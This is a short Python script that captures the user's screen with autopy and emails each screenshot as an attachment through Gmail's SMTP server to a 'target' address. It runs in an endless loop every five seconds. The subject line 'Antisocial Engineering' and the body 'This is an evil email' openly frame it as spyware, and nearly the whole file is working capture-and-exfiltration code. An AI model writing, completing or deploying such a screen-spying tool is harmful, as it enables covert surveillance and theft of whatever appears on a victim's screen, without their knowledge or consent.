import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.mime.text import MIMEText
from email import encoders
import os
import autopy
import time


user = 'your_acc@email.com'
pwd = 'your passwd'


def mail(to, subject, text, attach):
    bitmap = autopy.bitmap.capture_screen()
    bitmap.save('the file path to your image')

    msg = MIMEMultipart()
    msg['From'] = user
    msg['To'] = to
    msg['Subject'] = subject

    msg.attach(MIMEText(text))

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open(attach, 'rb').read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment; filename="%s"' % os.path.basename(attach))
    msg.attach(part)
    mailServer = smtplib.SMTP("smtp.gmail.com", 587)
    mailServer.ehlo()
    mailServer.starttls()
    mailServer.ehlo()
    mailServer.login(user, pwd)
    mailServer.sendmail(user, to, msg.as_string())
    mailServer.close()


def main():
    while True:
        mail("target_email@email.com", "Antisocial Engineering", "This is an evil email", "file path to your image")
        time.sleep(5)


if __name__ == '__main__':
    main()
